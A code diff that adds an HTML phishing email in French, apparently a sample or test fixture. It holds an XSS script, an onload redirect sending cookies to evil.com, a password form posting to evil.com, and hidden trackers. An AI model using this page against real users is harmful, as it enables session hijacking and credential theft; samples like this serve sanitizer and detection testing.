@@ -1,0 +1,29 @@
+<html>
+<head>
+<meta charset="utf-8">
+<script>alert('XSS attack!');</script>
+<style>
+  .hidden-tracker { display: none; }
+</style>
+</head>
+<body onload="document.location='https://evil.com/steal?cookie='+document.cookie">
+<h2>Urgent : Vérifiez votre compte !</h2>
+<p>Cher utilisateur,</p>
+<p>Nous avons détecté une activité suspecte sur votre compte.
+   Veuillez <a href="javascript:void(0)" onclick="stealCredentials()">cliquer ici</a>
+   pour vérifier votre identité immédiatement.</p>
+<p>Si vous ne le faites pas dans les 24 heures, votre compte sera
+   <span style="color: red; font-weight: bold;">SUSPENDU DÉFINITIVEMENT</span>.</p>
+<form action="https://evil.com/phish" method="POST">
+  <p>Email: <input type="text" name="email"></p>
+  <p>Mot de passe: <input type="password" name="password"></p>
+  <input type="submit" value="Vérifier mon compte">
+</form>
+<img src="https://evil.com/tracker.gif?id=12345" width="1" height="1" class="hidden-tracker">
+<iframe src="https://evil.com/hidden-frame" style="display:none;"></iframe>
+<p>Cordialement,<br>L'équipe Sécurité</p>
+<div style="font-size: 1px; color: white;">
+  Invisible tracking text with user fingerprint data 7f8a9b2c
+</div>
+</body>
+</html>
